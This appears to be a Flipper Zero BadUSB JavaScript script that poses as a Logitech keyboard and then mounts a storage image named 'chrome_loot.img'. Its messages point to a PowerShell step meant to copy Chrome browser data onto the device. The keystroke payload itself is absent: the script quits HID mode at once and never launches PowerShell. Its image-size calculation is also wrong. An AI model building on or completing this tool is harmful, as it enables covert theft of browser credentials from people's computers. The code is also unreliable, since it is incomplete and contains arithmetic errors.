// Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Mass storage details
let image = "/ext/apps_data/mass_storage/chrome_loot.img";
let size = 16 * 2056 * 2056; // 16 MB


// Check if mass storage already exists
print("Checking for Image...");
if (storage.exists(image)) {
    print("Storage Exists.");
} else {
    print("Creating Storage...");
    usbdisk.createImage(image, size);
}

// VID & PID as HID
badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfr_name: "Logitech",
    prod_name: "KeyBoard",
    layout_path: "/ext/badusb/assets/layouts/en-US.kl"
});

print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.quit();
delay(2000);
usbdisk.start(image);//Open MassStorage Folder
print("Please wait until powershell closes to eject");
delay(9000);
delay(9000);
delay(9000);
delay(9000);
delay(9000);
delay(9000);

// Wait for user to eject the mass storage
while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop the script
usbdisk.stop();
print("Done");


